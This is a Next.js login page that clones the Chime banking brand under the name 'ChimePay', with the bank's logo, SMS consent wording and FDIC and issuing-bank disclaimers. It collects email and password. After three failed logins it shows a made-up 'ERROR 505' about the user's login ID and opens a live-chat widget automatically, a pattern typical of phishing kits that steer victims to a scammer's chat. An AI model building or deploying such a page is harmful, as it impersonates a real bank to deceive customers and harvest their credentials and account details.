import { LogInComponents } from "@components/pages";
import type { Email, Password, NextPageWithLayout } from "@types";
import { ReactElement, useEffect, useState } from "react";
import Image from "next/image";
import Link from "next/link";
import Head from "next/head";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { loginUser } from "@services"; // returns user object or throws
import { useUser } from "@hooks";
import { ModalLayout } from "@components/composition";

interface FormValues {
  email: Email;
  password: Password;
}

// If SafeUser is something like this:
interface SafeUser {
  firstName: string;
  secondName: string;
  email: string;
  [key: string]: any;
}

const LogInPage: NextPageWithLayout = () => {
  const {
    register,
    handleSubmit,
    formState: { errors, isSubmitting },
  } = useForm<FormValues>();

  const [loginErrorMsg, setLoginErrorMsg] = useState<string>("");
  const [loginAttempts, setLoginAttempts] = useState<number>(0);

  const { push: navigate } = useRouter();
  const { user, setUser } = useUser();

  const onSubmit = async (loginData: FormValues) => {
    try {
      const userData = await loginUser(loginData); // assumed to return SafeUser

      if (!userData || !userData.email) {
        throw new Error("Invalid credentials");
      }

      setUser(userData);
      setLoginErrorMsg("");
      setLoginAttempts(0);
      navigate("/dashboard");
    } catch (error) {
      const attempts = loginAttempts + 1;
      setLoginAttempts(attempts);

      if (attempts >= 3) {
        setLoginErrorMsg(
          "ERROR 505 : There seems to be an issue with your login ID. Please chat with us now using the chatbot!"
        );

        const openChatInterval = setInterval(() => {
          if (
            typeof window !== "undefined" &&
            (window as any).tidioChatApi &&
            typeof (window as any).tidioChatApi.open === "function"
          ) {
            (window as any).tidioChatApi.open();
            clearInterval(openChatInterval);
          }
        }, 300);
      } else {
        setLoginErrorMsg("Invalid email or password. Please try again.");
      }
    }
  };

  useEffect(() => {
    if (user) {
      console.info(`Logged in as ${user.firstName} ${user.secondName}`);
    }
  }, [user]);

  return (
    <LogInComponents.Container>
      <Head>
        <title>Member Login | ChimePay</title>
        <meta name="description" content="ChimePay Clone Member Log In" />
      </Head>

      <LogInComponents.Logo>
        <Link href="/">
          <a>
            <Image
              src="/static/components/Header/chime-logo.png"
              alt="ChimePay Logo"
              width="250px"
              height="60px"
            />
          </a>
        </Link>
      </LogInComponents.Logo>

      <LogInComponents.Form.Container onSubmit={handleSubmit(onSubmit)}>
        {/* Email */}
        <LogInComponents.Form.Input
          type="email"
          placeholder="Email address"
          {...register("email", {
            required: "required",
            pattern: {
              value: /\S+@\S+\.\S+/,
              message: "Please correct your email address",
            },
          })}
        />
        {errors.email && (
          <LogInComponents.Form.Error>
            {errors.email.message}
          </LogInComponents.Form.Error>
        )}

        {/* Password */}
        <LogInComponents.Form.Input
          type="password"
          placeholder="Password"
          {...register("password", {
            required: "required",
            minLength: {
              value: 1,
              message: "Please correct your password",
            },
          })}
        />
        {errors.password && (
          <LogInComponents.Form.Error>
            {errors.password.message}
          </LogInComponents.Form.Error>
        )}

        {/* Submit */}
        <LogInComponents.Form.Submit disabled={isSubmitting} type="submit">
          Login
        </LogInComponents.Form.Submit>

        {/* Error Message */}
        {loginErrorMsg && (
          <LogInComponents.Form.Error
            style={{ color: "red", fontSize: "19px" }}
          >
            {loginErrorMsg}
          </LogInComponents.Form.Error>
        )}
      </LogInComponents.Form.Container>

      <LogInComponents.Text1>
        By clicking “Log In”, you agree to receive SMS text messages from Chime
        to verify your identity
      </LogInComponents.Text1>

      <LogInComponents.Text2>
        © 2025 ChimePay. All Rights Reserved.
      </LogInComponents.Text2>

      <LogInComponents.Text3>
        Banking Services provided by The Bancorp Bank or Stride Bank, N.A.,
        Members FDIC. The ChimePay Visa® Debit Card is issued by The Bancorp
        Bank or Stride Bank pursuant to a license from Visa U.S.A. Inc. and may
        be used everywhere Visa debit cards are accepted. Please see back of
        your Card for its issuing bank.
      </LogInComponents.Text3>
    </LogInComponents.Container>
  );
};

LogInPage.getLayout = (page: ReactElement) => <ModalLayout>{page}</ModalLayout>;

export default LogInPage;
